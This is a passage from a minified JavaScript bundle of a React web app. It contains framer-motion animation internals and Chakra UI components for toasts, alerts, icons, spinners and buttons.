                              t = () => (oj.current = e.matches);
                          e.addListener(t), t();
                      } else oj.current = !1;
              })(),
          (this.shouldReduceMotion = "never" !== this.reducedMotionConfig && ("always" === this.reducedMotionConfig || oj.current)),
          this.parent && this.parent.children.add(this),
          this.update(this.props, this.presenceContext);
  }
  unmount() {
      ij.delete(this.current),
          this.projection && this.projection.unmount(),
          vP(this.notifyUpdate),
          vP(this.render),
          this.valueSubscriptions.forEach((e) => e()),
          this.removeFromVariantTree && this.removeFromVariantTree(),
          this.parent && this.parent.children.delete(this);
      for (const e in this.events) this.events[e].clear();
      for (const e in this.features) this.features[e].unmount();
      this.current = null;
  }
  bindToMotionValue(e, t) {
      const n = WC.has(e),
          r = t.on("change", (t) => {
              (this.latestValues[e] = t), this.props.onUpdate && gP.update(this.notifyUpdate, !1, !0), n && this.projection && (this.projection.isTransformDirty = !0);
          }),
          o = t.on("renderRequest", this.scheduleRender);
      this.valueSubscriptions.set(e, () => {
          r(), o();
      });
  }
  sortNodePosition(e) {
      return this.current && this.sortInstanceNodePosition && this.type === e.type ? this.sortInstanceNodePosition(this.current, e.current) : 0;
  }
  loadFeatures({ children: e, ...t }, n, r, o) {
      let a, i;
      for (let s = 0; s < lj; s++) {
          const e = sj[s],
              { isEnabled: n, Feature: r, ProjectionNode: o, MeasureLayout: l } = OC[e];
          o && (a = o), n(t) && (!this.features[e] && r && (this.features[e] = new r(this)), l && (i = l));
      }
      if (!this.projection && a) {
          this.projection = new a(this.latestValues, this.parent && this.parent.projection);
          const { layoutId: e, layout: n, drag: r, dragConstraints: i, layoutScroll: s, layoutRoot: l } = t;
          this.projection.setOptions({
              layoutId: e,
              layout: n,
              alwaysMeasureLayout: Boolean(r) || (i && kC(i)),
              visualElement: this,
              scheduleRender: () => this.scheduleRender(),
              animationType: "string" == typeof n ? n : "both",
              initialPromotionConfig: o,
              layoutScroll: s,
              layoutRoot: l,
          });
      }
      return i;
  }
  updateFeatures() {
      for (const e in this.features) {
          const t = this.features[e];
          t.isMounted ? t.update() : (t.mount(), (t.isMounted = !0));
      }
  }
  triggerBuild() {
      this.build(this.renderState, this.latestValues, this.options, this.props);
  }
  measureViewportBox() {
      return this.current ? this.measureInstanceViewportBox(this.current, this.props) : bz();
  }
  getStaticValue(e) {
      return this.latestValues[e];
  }
  setStaticValue(e, t) {
      this.latestValues[e] = t;
  }
  makeTargetAnimatable(e, t = !0) {
      return this.makeTargetAnimatableFromInstance(e, this.props, t);
  }
  update(e, t) {
      (e.transformTemplate || this.props.transformTemplate) && this.scheduleRender(), (this.prevProps = this.props), (this.props = e), (this.prevPresenceContext = this.presenceContext), (this.presenceContext = t);
      for (let n = 0; n < cj.length; n++) {
          const t = cj[n];
          this.propEventSubscriptions[t] && (this.propEventSubscriptions[t](), delete this.propEventSubscriptions[t]);
          const r = e["on" + t];
          r && (this.propEventSubscriptions[t] = this.on(t, r));
      }
      (this.prevMotionValues = (function (e, t, n) {
          const { willChange: r } = t;
          for (const o in t) {
              const a = t[o],
                  i = n[o];
              if (qC(a)) e.addValue(o, a), PR(r) && r.add(o);
              else if (qC(i)) e.addValue(o, jR(a, { owner: e })), PR(r) && r.remove(o);
              else if (i !== a)
                  if (e.hasValue(o)) {
                      const t = e.getValue(o);
                      !t.hasAnimated && t.set(a);
                  } else {
                      const t = e.getStaticValue(o);
                      e.addValue(o, jR(void 0 !== t ? t : a, { owner: e }));
                  }
          }
          for (const o in n) void 0 === t[o] && e.removeValue(o);
          return t;
      })(this, this.scrapeMotionValuesFromProps(e, this.prevProps), this.prevMotionValues)),
          this.handleChildMotionValue && this.handleChildMotionValue();
  }
  getProps() {
      return this.props;
  }
  getVariant(e) {
      return this.props.variants ? this.props.variants[e] : void 0;
  }
  getDefaultTransition() {
      return this.props.transition;
  }
  getTransformPagePoint() {
      return this.props.transformPagePoint;
  }
  getClosestVariantNode() {
      return this.isVariantNode ? this : this.parent ? this.parent.getClosestVariantNode() : void 0;
  }
  getVariantContext(e = !1) {
      if (e) return this.parent ? this.parent.getVariantContext() : void 0;
      if (!this.isControllingVariants) {
          const e = (this.parent && this.parent.getVariantContext()) || {};
          return void 0 !== this.props.initial && (e.initial = this.props.initial), e;
      }
      const t = {};
      for (let n = 0; n < uj; n++) {
          const e = PC[n],
              r = this.props[e];
          (EC(r) || !1 === r) && (t[e] = r);
      }
      return t;
  }
  addVariantChild(e) {
      const t = this.getClosestVariantNode();
      if (t) return t.variantChildren && t.variantChildren.add(e), () => t.variantChildren.delete(e);
  }
  addValue(e, t) {
      t !== this.values.get(e) && (this.removeValue(e), this.bindToMotionValue(e, t)), this.values.set(e, t), (this.latestValues[e] = t.get());
  }
  removeValue(e) {
      this.values.delete(e);
      const t = this.valueSubscriptions.get(e);
      t && (t(), this.valueSubscriptions.delete(e)), delete this.latestValues[e], this.removeValueFromRenderState(e, this.renderState);
  }
  hasValue(e) {
      return this.values.has(e);
  }
  getValue(e, t) {
      if (this.props.values && this.props.values[e]) return this.props.values[e];
      let n = this.values.get(e);
      return void 0 === n && void 0 !== t && ((n = jR(t, { owner: this })), this.addValue(e, n)), n;
  }
  readValue(e) {
      return void 0 === this.latestValues[e] && this.current ? this.readValueFromInstance(this.current, e, this.options) : this.latestValues[e];
  }
  setBaseTarget(e, t) {
      this.baseTarget[e] = t;
  }
  getBaseTarget(e) {
      var t;
      const { initial: n } = this.props,
          r = "string" == typeof n || "object" == typeof n ? (null === (t = D_(this.props, n)) || void 0 === t ? void 0 : t[e]) : void 0;
      if (n && void 0 !== r) return r;
      const o = this.getBaseTargetFromProps(this.props, e);
      return void 0 === o || qC(o) ? (void 0 !== this.initialValues[e] && void 0 === r ? void 0 : this.baseTarget[e]) : o;
  }
  on(e, t) {
      return this.events[e] || (this.events[e] = new zR()), this.events[e].add(t);
  }
  notify(e, ...t) {
      this.events[e] && this.events[e].notify(...t);
  }
}
class fj extends dj {
  sortInstanceNodePosition(e, t) {
      return 2 & e.compareDocumentPosition(t) ? 1 : -1;
  }
  getBaseTargetFromProps(e, t) {
      return e.style ? e.style[t] : void 0;
  }
  removeValueFromRenderState(e, { vars: t, style: n }) {
      delete t[e], delete n[e];
  }
  makeTargetAnimatableFromInstance({ transition: e, transitionEnd: t, ...n }, { transformValues: r }, o) {
      let a = (function (e, t, n) {
          const r = {};
          for (const o in e) {
              const e = IR(o, t);
              if (void 0 !== e) r[o] = e;
              else {
                  const e = n.getValue(o);
                  e && (r[o] = e.get());
              }
          }
          return r;
      })(n, e || {}, this);
      if ((r && (t && (t = r(t)), n && (n = r(n)), a && (a = r(a))), o)) {
          !(function (e, t, n) {
              var r, o;
              const a = Object.keys(t).filter((t) => !e.hasValue(t)),
                  i = a.length;
              if (i)
                  for (let s = 0; s < i; s++) {
                      const i = a[s],
                          l = t[i];
                      let c = null;
                      Array.isArray(l) && (c = l[0]),
                          null === c && (c = null !== (o = null !== (r = n[i]) && void 0 !== r ? r : e.readValue(i)) && void 0 !== o ? o : t[i]),
                          null != c &&
                              ("string" == typeof c && (/^\-?\d*\.?\d+$/.test(c) || kR(c)) ? (c = parseFloat(c)) : !LR(c) && zT.test(l) && (c = SR(i, l)),
                              e.addValue(i, jR(c, { owner: e })),
                              void 0 === n[i] && (n[i] = c),
                              null !== c && e.setBaseTarget(i, c));
                  }
          })(this, n, a);
          const e = rj(this, n, a, t);
          (t = e.transitionEnd), (n = e.target);
      }
      return { transition: e, transitionEnd: t, ...n };
  }
}
class pj extends fj {
  readValueFromInstance(e, t) {
      if (WC.has(t)) {
          const e = wR(t);
          return (e && e.default) || 0;
      }
      {
          const r = ((n = e), window.getComputedStyle(n)),
              o = (QC(t) ? r.getPropertyValue(t) : r[t]) || 0;
          return "string" == typeof o ? o.trim() : o;
      }
      var n;
  }
  measureInstanceViewportBox(e, { transformPagePoint: t }) {
      return Lz(e, t);
  }
  build(e, t, n, r) {
      v_(e, t, n, r.transformTemplate);
  }
  scrapeMotionValuesFromProps(e, t) {
      return B_(e, t);
  }
  handleChildMotionValue() {
      this.childSubscription && (this.childSubscription(), delete this.childSubscription);
      const { children: e } = this.props;
      qC(e) &&
          (this.childSubscription = e.on("change", (e) => {
              this.current && (this.current.textContent = `${e}`);
          }));
  }
  renderInstance(e, t, n, r) {
      N_(e, t, n, r);
  }
}
class hj extends fj {
  constructor() {
      super(...arguments), (this.isSVGTag = !1);
  }
  getBaseTargetFromProps(e, t) {
      return e[t];
  }
  readValueFromInstance(e, t) {
      if (WC.has(t)) {
          const e = wR(t);
          return (e && e.default) || 0;
      }
      return (t = M_.has(t) ? t : F_(t)), e.getAttribute(t);
  }
  measureInstanceViewportBox() {
      return bz();
  }
  scrapeMotionValuesFromProps(e, t) {
      return I_(e, t);
  }
  build(e, t, n, r) {
      R_(e, t, n, this.isSVGTag, r.transformTemplate);
  }
  renderInstance(e, t, n, r) {
      L_(e, t, 0, r);
  }
  mount(e) {
      (this.isSVGTag = A_(e.tagName)), super.mount(e);
  }
}
const mj = (e, t) => ($C(e) ? new hj(t, { enableHardwareAcceleration: !1 }) : new pj(t, { enableHardwareAcceleration: !0 })),
  gj = { ...KR, ...TP, ...WA, ...{ layout: { ProjectionNode: UA, MeasureLayout: Yz } } },
  vj = IC((e, t) =>
      (function (e, { forwardMotionProps: t = !1 }, n, r) {
          return { ...($C(e) ? X_ : G_), preloadedFeatures: n, useRender: O_(t), createVisualElement: r, Component: e };
      })(e, t, gj, mj)
  );
function yj() {
  const e = D.useRef(!1);
  return (
      wC(
          () => (
              (e.current = !0),
              () => {
                  e.current = !1;
              }
          ),
          []
      ),
      e
  );
}
class bj extends D.Component {
  getSnapshotBeforeUpdate(e) {
      const t = this.props.childRef.current;
      if (t && e.isPresent && !this.props.isPresent) {
          const e = this.props.sizeRef.current;
          (e.height = t.offsetHeight || 0), (e.width = t.offsetWidth || 0), (e.top = t.offsetTop), (e.left = t.offsetLeft);
      }
      return null;
  }
  componentDidUpdate() {}
  render() {
      return this.props.children;
  }
}
function xj({ children: e, isPresent: t }) {
  const n = D.useId(),
      r = D.useRef(null),
      o = D.useRef({ width: 0, height: 0, top: 0, left: 0 });
  return (
      D.useInsertionEffect(() => {
          const { width: e, height: a, top: i, left: s } = o.current;
          if (t || !r.current || !e || !a) return;
          r.current.dataset.motionPopId = n;
          const l = document.createElement("style");
          return (
              document.head.appendChild(l),
              l.sheet &&
                  l.sheet.insertRule(
                      `\n          [data-motion-pop-id="${n}"] {\n            position: absolute !important;\n            width: ${e}px !important;\n            height: ${a}px !important;\n            top: ${i}px !important;\n            left: ${s}px !important;\n          }\n        `
                  ),
              () => {
                  document.head.removeChild(l);
              }
          );
      }, [t]),
      D.createElement(bj, { isPresent: t, childRef: r, sizeRef: o }, D.cloneElement(e, { ref: r }))
  );
}
const wj = ({ children: e, initial: t, isPresent: n, onExitComplete: r, custom: o, presenceAffectsLayout: a, mode: i }) => {
  const s = $_(Sj),
      l = D.useId(),
      c = D.useMemo(
          () => ({
              id: l,
              initial: t,
              isPresent: n,
              custom: o,
              onExitComplete: (e) => {
                  s.set(e, !0);
                  for (const t of s.values()) if (!t) return;
                  r && r();
              },
              register: (e) => (s.set(e, !1), () => s.delete(e)),
          }),
          a ? void 0 : [n]
      );
  return (
      D.useMemo(() => {
          s.forEach((e, t) => s.set(t, !1));
      }, [n]),
      D.useEffect(() => {
          !n && !s.size && r && r();
      }, [n]),
      "popLayout" === i && (e = D.createElement(xj, { isPresent: n }, e)),
      D.createElement(bC.Provider, { value: c }, e)
  );
};
function Sj() {
  return new Map();
}
const kj = (e) => e.key || "";
const Ej = ({ children: e, custom: t, initial: n = !0, onExitComplete: r, exitBeforeEnter: o, presenceAffectsLayout: a = !0, mode: i = "sync" }) => {
  const s =
          D.useContext(FC).forceRender ||
          (function () {
              const e = yj(),
                  [t, n] = D.useState(0),
                  r = D.useCallback(() => {
                      e.current && n(t + 1);
                  }, [t]);
              return [D.useCallback(() => gP.postRender(r), [r]), t];
          })()[0],
      l = yj(),
      c = (function (e) {
          const t = [];
          return (
              D.Children.forEach(e, (e) => {
                  D.isValidElement(e) && t.push(e);
              }),
              t
          );
      })(e);
  let u = c;
  const d = D.useRef(new Map()).current,
      f = D.useRef(u),
      p = D.useRef(new Map()).current,
      h = D.useRef(!0);
  var m;
  if (
      (wC(() => {
          (h.current = !1),
              (function (e, t) {
                  e.forEach((e) => {
                      const n = kj(e);
                      t.set(n, e);
                  });
              })(c, p),
              (f.current = u);
      }),
      (m = () => {
          (h.current = !0), p.clear(), d.clear();
      }),
      D.useEffect(() => () => m(), []),
      h.current)
  )
      return D.createElement(
          D.Fragment,
          null,
          u.map((e) => D.createElement(wj, { key: kj(e), isPresent: !0, initial: !!n && void 0, presenceAffectsLayout: a, mode: i }, e))
      );
  u = [...u];
  const g = f.current.map(kj),
      v = c.map(kj),
      y = g.length;
  for (let b = 0; b < y; b++) {
      const e = g[b];
      -1 !== v.indexOf(e) || d.has(e) || d.set(e, void 0);
  }
  return (
      "wait" === i && d.size && (u = []),
      d.forEach((e, n) => {
          if (-1 !== v.indexOf(n)) return;
          const o = p.get(n);
          if (!o) return;
          const h = g.indexOf(n);
          let m = e;
          if (!m) {
              const e = () => {
                  p.delete(n), d.delete(n);
                  const e = f.current.findIndex((e) => e.key === n);
                  if ((f.current.splice(e, 1), !d.size)) {
                      if (((f.current = c), !1 === l.current)) return;
                      s(), r && r();
                  }
              };
              (m = D.createElement(wj, { key: kj(o), isPresent: !1, onExitComplete: e, custom: t, presenceAffectsLayout: a, mode: i }, o)), d.set(n, m);
          }
          u.splice(h, 0, m);
      }),
      (u = u.map((e) => {
          const t = e.key;
          return d.has(t) ? e : D.createElement(wj, { key: kj(e), isPresent: !0, presenceAffectsLayout: a, mode: i }, e);
      })),
      D.createElement(D.Fragment, null, d.size ? u : u.map((e) => D.cloneElement(e)))
  );
};
var Cj = {
      initial: (e) => {
          const { position: t } = e,
              n = ["top", "bottom"].includes(t) ? "y" : "x";
          let r = ["top-right", "bottom-right"].includes(t) ? 1 : -1;
          return "bottom" === t && (r = 1), { opacity: 0, [n]: 24 * r };
      },
      animate: { opacity: 1, y: 0, x: 0, scale: 1, transition: { duration: 0.4, ease: [0.4, 0, 0.2, 1] } },
      exit: { opacity: 0, scale: 0.85, transition: { duration: 0.2, ease: [0.4, 0, 1, 1] } },
  },
  _j = D.memo((e) => {
      const { id: t, message: n, onCloseComplete: r, onRequestRemove: o, requestClose: a = !1, position: i = "bottom", duration: s = 5e3, containerStyle: l, motionVariants: c = Cj, toastSpacing: u = "0.5rem" } = e,
          [d, f] = D.useState(s),
          p = null === (h = D.useContext(bC)) || h.isPresent;
      var h;
      gC(() => {
          p || null == r || r();
      }, [p]),
          gC(() => {
              f(s);
          }, [s]);
      const m = () => {
          p && o();
      };
      D.useEffect(() => {
          p && a && o();
      }, [p, a, o]),
          mC(m, d);
      const g = D.useMemo(() => ({ pointerEvents: "auto", maxWidth: 560, minWidth: 300, margin: u, ...l }), [l, u]),
          v = D.useMemo(
              () =>
                  (function (e) {
                      let t = "center";
                      return e.includes("right") && (t = "flex-end"), e.includes("left") && (t = "flex-start"), { display: "flex", flexDirection: "column", alignItems: t };
                  })(i),
              [i]
          );
      return Q.jsx(vj.div, {
          layout: !0,
          className: "chakra-toast",
          variants: c,
          initial: "initial",
          animate: "animate",
          exit: "exit",
          onHoverStart: () => f(null),
          onHoverEnd: () => f(s),
          custom: { position: i },
          style: v,
          children: Q.jsx(rC.div, { role: "status", "aria-atomic": "true", className: "chakra-toast__inner", __css: g, children: wg(n, { id: t, onClose: m }) }),
      });
  });
_j.displayName = "ToastComponent";
var Pj = {
      path: Q.jsxs("g", {
          stroke: "currentColor",
          strokeWidth: "1.5",
          children: [
              Q.jsx("path", { strokeLinecap: "round", fill: "none", d: "M9,9a3,3,0,1,1,4,2.829,1.5,1.5,0,0,0-1,1.415V14.25" }),
              Q.jsx("path", { fill: "currentColor", strokeLinecap: "round", d: "M12,17.25a.375.375,0,1,0,.375.375A.375.375,0,0,0,12,17.25h0" }),
              Q.jsx("circle", { fill: "none", strokeMiterlimit: "10", cx: "12", cy: "12", r: "11.25" }),
          ],
      }),
      viewBox: "0 0 24 24",
  },
  Tj = oC((e, t) => {
      const { as: n, viewBox: r, color: o = "currentColor", focusable: a = !1, children: i, className: s, __css: l, ...c } = e,
          u = { ref: t, focusable: a, className: bg("chakra-icon", s), __css: { w: "1em", h: "1em", display: "inline-block", lineHeight: "1em", flexShrink: 0, color: o, ...l, ...$E("Icon", e) } },
          d = null != r ? r : Pj.viewBox;
      if (n && "string" != typeof n) return Q.jsx(rC.svg, { as: n, ...u, ...c });
      const f = null != i ? i : Pj.path;
      return Q.jsx(rC.svg, { verticalAlign: "middle", viewBox: d, ...u, ...c, children: f });
  });
function Rj(e) {
  return Q.jsx(Tj, {
      viewBox: "0 0 24 24",
      ...e,
      children: Q.jsx("path", {
          fill: "currentColor",
          d:
              "M11.983,0a12.206,12.206,0,0,0-8.51,3.653A11.8,11.8,0,0,0,0,12.207,11.779,11.779,0,0,0,11.8,24h.214A12.111,12.111,0,0,0,24,11.791h0A11.766,11.766,0,0,0,11.983,0ZM10.5,16.542a1.476,1.476,0,0,1,1.449-1.53h.027a1.527,1.527,0,0,1,1.523,1.47,1.475,1.475,0,0,1-1.449,1.53h-.027A1.529,1.529,0,0,1,10.5,16.542ZM11,12.5v-6a1,1,0,0,1,2,0v6a1,1,0,1,1-2,0Z",
      }),
  });
}
Tj.displayName = "Icon";
var zj = (function () {
      var e = Wm.apply(void 0, arguments),
          t = "animation-" + e.name;
      return {
          name: t,
          styles: "@keyframes " + t + "{" + e.styles + "}",
          anim: 1,
          toString: function () {
              return "_EMO_" + this.name + "_" + this.styles + "_EMO_";
          },
      };
  })({ "0%": { transform: "rotate(0deg)" }, "100%": { transform: "rotate(360deg)" } }),
  Aj = oC((e, t) => {
      const n = $E("Spinner", e),
          { label: r = "Loading...", thickness: o = "2px", speed: a = "0.45s", emptyColor: i = "transparent", className: s, ...l } = fy(e),
          c = bg("chakra-spinner", s),
          u = { display: "inline-block", borderColor: "currentColor", borderStyle: "solid", borderRadius: "99999px", borderWidth: o, borderBottomColor: i, borderLeftColor: i, animation: `${zj} ${a} linear infinite`, ...n };
      return Q.jsx(rC.div, { ref: t, __css: u, className: c, ...l, children: r && Q.jsx(rC.span, { srOnly: !0, children: r }) });
  });
Aj.displayName = "Spinner";
var [jj, Oj] = Gm({ name: "AlertContext", hookName: "useAlertContext", providerName: "<Alert />" }),
  [Fj, Nj] = Gm({ name: "AlertStylesContext", hookName: "useAlertStyles", providerName: "<Alert />" }),
  Mj = {
      info: {
          icon: function (e) {
              return Q.jsx(Tj, {
                  viewBox: "0 0 24 24",
                  ...e,
                  children: Q.jsx("path", {
                      fill: "currentColor",
                      d:
                          "M12,0A12,12,0,1,0,24,12,12.013,12.013,0,0,0,12,0Zm.25,5a1.5,1.5,0,1,1-1.5,1.5A1.5,1.5,0,0,1,12.25,5ZM14.5,18.5h-4a1,1,0,0,1,0-2h.75a.25.25,0,0,0,.25-.25v-4.5a.25.25,0,0,0-.25-.25H10.5a1,1,0,0,1,0-2h1a2,2,0,0,1,2,2v4.75a.25.25,0,0,0,.25.25h.75a1,1,0,1,1,0,2Z",
                  }),
              });
          },
          colorScheme: "blue",
      },
      warning: { icon: Rj, colorScheme: "orange" },
      success: {
          icon: function (e) {
              return Q.jsx(Tj, {
                  viewBox: "0 0 24 24",
                  ...e,
                  children: Q.jsx("path", {
                      fill: "currentColor",
                      d: "M12,0A12,12,0,1,0,24,12,12.014,12.014,0,0,0,12,0Zm6.927,8.2-6.845,9.289a1.011,1.011,0,0,1-1.43.188L5.764,13.769a1,1,0,1,1,1.25-1.562l4.076,3.261,6.227-8.451A1,1,0,1,1,18.927,8.2Z",
                  }),
              });
          },
          colorScheme: "green",
      },
      error: { icon: Rj, colorScheme: "red" },
      loading: { icon: Aj, colorScheme: "blue" },
  };
var Lj = oC(function (e, t) {
  const n = Nj(),
      { status: r } = Oj(),
      o = { display: "inline", ...n.description };
  return Q.jsx(rC.div, { ref: t, "data-status": r, ...e, className: bg("chakra-alert__desc", e.className), __css: o });
});
function Bj(e) {
  const { status: t } = Oj(),
      n = (function (e) {
          return Mj[e].icon;
      })(t),
      r = Nj(),
      o = "loading" === t ? r.spinner : r.icon;
  return Q.jsx(rC.span, { display: "inherit", "data-status": t, ...e, className: bg("chakra-alert__icon", e.className), __css: o, children: e.children || Q.jsx(n, { h: "100%", w: "100%" }) });
}
(Lj.displayName = "AlertDescription"), (Bj.displayName = "AlertIcon");
var Ij = oC(function (e, t) {
  const n = Nj(),
      { status: r } = Oj();
  return Q.jsx(rC.div, { ref: t, "data-status": r, ...e, className: bg("chakra-alert__title", e.className), __css: n.title });
});
Ij.displayName = "AlertTitle";
var Dj = oC(function (e, t) {
  var n;
  const { status: r = "info", addRole: o = !0, ...a } = fy(e),
      i =
          null != (n = e.colorScheme)
              ? n
              : (function (e) {
                    return Mj[e].colorScheme;
                })(r),
      s = VE("Alert", { ...e, colorScheme: i }),
      l = { width: "100%", display: "flex", alignItems: "center", position: "relative", overflow: "hidden", ...s.container };
  return Q.jsx(jj, { value: { status: r }, children: Q.jsx(Fj, { value: s, children: Q.jsx(rC.div, { "data-status": r, role: o ? "alert" : void 0, ref: t, ...a, className: bg("chakra-alert", e.className), __css: l }) }) });
});
function $j(e) {
  return Q.jsx(Tj, {
      focusable: "false",
      "aria-hidden": !0,
      ...e,
      children: Q.jsx("path", {
          fill: "currentColor",
          d:
              "M.439,21.44a1.5,1.5,0,0,0,2.122,2.121L11.823,14.3a.25.25,0,0,1,.354,0l9.262,9.263a1.5,1.5,0,1,0,2.122-2.121L14.3,12.177a.25.25,0,0,1,0-.354l9.263-9.262A1.5,1.5,0,0,0,21.439.44L12.177,9.7a.25.25,0,0,1-.354,0L2.561.44A1.5,1.5,0,0,0,.439,2.561L9.7,11.823a.25.25,0,0,1,0,.354Z",
      }),
  });
}
Dj.displayName = "Alert";
var Vj = oC(function (e, t) {
  const n = $E("CloseButton", e),
      { children: r, isDisabled: o, __css: a, ...i } = fy(e);
  return Q.jsx(rC.button, {
      type: "button",
      "aria-label": "Close",
      ref: t,
      disabled: o,
      __css: { outline: 0, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, ...n, ...a },
      ...i,
      children: r || Q.jsx($j, { width: "1em", height: "1em" }),
  });
});
Vj.displayName = "CloseButton";
var Uj = (function (e) {
  let t = e;
  const n = new Set(),
      r = (e) => {
          (t = e(t)), n.forEach((e) => e());
      };
  return {
      getState: () => t,
      subscribe: (t) => (
          n.add(t),
          () => {
              r(() => e), n.delete(t);
          }
      ),
      removeToast: (e, t) => {
          r((n) => ({ ...n, [t]: n[t].filter((t) => t.id != e) }));
      },
      notify: (e, t) => {
          const n = (function (e, t = {}) {
                  var n, r;
                  Wj += 1;
                  const o = null != (n = t.id) ? n : Wj,
                      a = null != (r = t.position) ? r : "bottom";
                  return {
                      id: o,
                      message: e,
                      position: a,
                      duration: t.duration,
                      onCloseComplete: t.onCloseComplete,
                      onRequestRemove: () => Uj.removeToast(String(o), a),
                      status: t.status,
                      requestClose: !1,
                      containerStyle: t.containerStyle,
                  };
              })(e, t),
              { position: o, id: a } = n;
          return (
              r((e) => {
                  var t, r;
                  const a = o.includes("top") ? [n, ...(null != (t = e[o]) ? t : [])] : [...(null != (r = e[o]) ? r : []), n];
                  return { ...e, [o]: a };
              }),
              a
          );
      },
      update: (e, t) => {
          e &&
              r((n) => {
                  const r = { ...n },
                      { position: o, index: a } = fC(r, e);
                  return o && -1 !== a && (r[o][a] = { ...r[o][a], ...t, message: qj(t) }), r;
              });
      },
      closeAll: ({ positions: e } = {}) => {
          r((t) => (null != e ? e : ["bottom", "bottom-right", "bottom-left", "top", "top-left", "top-right"]).reduce((e, n) => ((e[n] = t[n].map((e) => ({ ...e, requestClose: !0 }))), e), { ...t }));
      },
      close: (e) => {
          r((t) => {
              const n = pC(t, e);
              return n ? { ...t, [n]: t[n].map((t) => (t.id == e ? { ...t, requestClose: !0 } : t)) } : t;
          });
      },
      isActive: (e) => Boolean(fC(Uj.getState(), e).position),
  };
})({ top: [], "top-left": [], "top-right": [], "bottom-left": [], bottom: [], "bottom-right": [] });
var Wj = 0;
var Hj = (e) => {
  const { status: t, variant: n = "solid", id: r, title: o, isClosable: a, onClose: i, description: s, colorScheme: l, icon: c } = e,
      u = r ? { root: `toast-${r}`, title: `toast-${r}-title`, description: `toast-${r}-description` } : void 0;
  return Q.jsxs(Dj, {
      addRole: !1,
      status: t,
      variant: n,
      id: null == u ? void 0 : u.root,
      alignItems: "start",
      borderRadius: "md",
      boxShadow: "lg",
      paddingEnd: 8,
      textAlign: "start",
      width: "auto",
      colorScheme: l,
      children: [
          Q.jsx(Bj, { children: c }),
          Q.jsxs(rC.div, { flex: "1", maxWidth: "100%", children: [o && Q.jsx(Ij, { id: null == u ? void 0 : u.title, children: o }), s && Q.jsx(Lj, { id: null == u ? void 0 : u.description, display: "block", children: s })] }),
          a && Q.jsx(Vj, { size: "sm", onClick: i, position: "absolute", insetEnd: 1, top: 1 }),
      ],
  });
};
function qj(e = {}) {
  const { render: t, toastComponent: n = Hj } = e;
  return (r) => ("function" == typeof t ? t({ ...r, ...e }) : Q.jsx(n, { ...r, ...e }));
}
var Yj,
  [Xj, Gj] = Gm({ name: "ToastOptionsContext", strict: !1 }),
  Qj = (e) => {
      const t = D.useSyncExternalStore(Uj.subscribe, Uj.getState, Uj.getState),
          { motionVariants: n, component: r = _j, portalProps: o } = e,
          a = Object.keys(t).map((e) => {
              const o = t[e];
              return Q.jsx("div", { role: "region", "aria-live": "polite", id: `chakra-toast-manager-${e}`, style: hC(e), children: Q.jsx(Ej, { initial: !1, children: o.map((e) => Q.jsx(r, { motionVariants: n, ...e }, e.id)) }) }, e);
          });
      return Q.jsx(ig, { ...o, children: a });
  },
  Kj =
      ((Yj = EE),
      function ({ children: e, theme: t = Yj, toastOptions: n, ...r }) {
          return Q.jsxs(uC, { theme: t, ...r, children: [Q.jsx(Xj, { value: null == n ? void 0 : n.defaultOptions, children: e }), Q.jsx(Qj, { ...n })] });
      });
function Zj(...e) {
  return (t) => {
      e.forEach((e) => {
          !(function (e, t) {
              if (null != e)
                  if ("function" != typeof e)
                      try {
                          e.current = t;
                      } catch (n) {
                          throw new Error(`Cannot assign value '${t}' to ref '${e}'`);
                      }
                  else e(t);
          })(e, t);
      });
  };
}
function Jj(...e) {
  return D.useMemo(() => Zj(...e), e);
}
function eO(e) {
  return D.Children.toArray(e).filter((e) => D.isValidElement(e));
}
var [tO, nO] = Gm({ strict: !1, name: "ButtonGroupContext" });
function rO(e) {
  const { children: t, className: n, ...r } = e,
      o = D.isValidElement(t) ? D.cloneElement(t, { "aria-hidden": !0, focusable: !1 }) : t,
      a = bg("chakra-button__icon", n);
  return Q.jsx(rC.span, { display: "inline-flex", alignSelf: "center", flexShrink: 0, ...r, className: a, children: o });
}
function oO(e) {
  const { label: t, placement: n, spacing: r = "0.5rem", children: o = Q.jsx(Aj, { color: "currentColor", width: "1em", height: "1em" }), className: a, __css: i, ...s } = e,
      l = bg("chakra-button__spinner", a),
      c = "start" === n ? "marginEnd" : "marginStart",
      u = D.useMemo(() => ({ display: "flex", alignItems: "center", position: t ? "relative" : "absolute", [c]: t ? r : 0, fontSize: "1em", lineHeight: "normal", ...i }), [i, t, c, r]);
  return Q.jsx(rC.div, { className: l, ...s, __css: u, children: o });
}
(rO.displayName = "ButtonIcon"), (oO.displayName = "ButtonSpinner");
var aO = oC((e, t) => {
  const n = nO(),
      r = $E("Button", { ...n, ...e }),
      {
          isDisabled: o = null == n ? void 0 : n.isDisabled,
          isLoading: a,
          isActive: i,
          children: s,
          leftIcon: l,
          rightIcon: c,
          loadingText: u,
          iconSpacing: d = "0.5rem",
          type: f,
          spinner: p,
          spinnerPlacement: h = "start",
          className: m,
          as: g,
          ...v
      } = fy(e),
      y = D.useMemo(() => {
          const e = { ...(null == r ? void 0 : r._focus), zIndex: 1 };
          return {
              display: "inline-flex",
              appearance: "none",
              alignItems: "center",
              justifyContent: "center",
              userSelect: "none",
              position: "relative",
              whiteSpace: "nowrap",
              verticalAlign: "middle",
              outline: "none",
              ...r,
              ...(!!n && { _focus: e }),
          };
      }, [r, n]),
      { ref: b, type: x } = (function (e) {
          const [t, n] = D.useState(!e);
          return {
              ref: D.useCallback((e) => {
                  e && n("BUTTON" === e.tagName);
              }, []),
              type: t ? "button" : void 0,
          };
      })(g),
      w = { rightIcon: c, leftIcon: l, iconSpacing: d, children: s };
  return Q.jsxs(rC.button, {
      ref: Jj(t, b),
      as: g,
      type: null != f ? f : x,
      "data-active": kg(i),
      "data-loading": kg(a),
      __css: y,
      className: bg("chakra-button", m),
      ...v,
      disabled: o || a,
      children: [
          a && "start" === h && Q.jsx(oO, { className: "chakra-button__spinner--start", label: u, placement: "start", spacing: d, children: p }),
          a ? u || Q.jsx(rC.span, { opacity: 0, children: Q.jsx(iO, { ...w }) }) : Q.jsx(iO, { ...w }),
          a && "end" === h && Q.jsx(oO, { className: "chakra-button__spinner--end", label: u, placement: "end", spacing: d, children: p }),
      ],
  });
});
function iO(e) {
  const { leftIcon: t, rightIcon: n, children: r, iconSpacing: o } = e;
  return Q.jsxs(Q.Fragment, { children: [t && Q.jsx(rO, { marginEnd: o, children: t }), r, n && Q.jsx(rO, { marginStart: o, children: n })] });
}
aO.displayName = "Button";
var [sO, lO] = Gm({ name: "FormControlStylesContext", errorMessage: "useFormControlStyles returned is 'undefined'. Seems you forgot to wrap the components in \"<FormControl />\" " }),
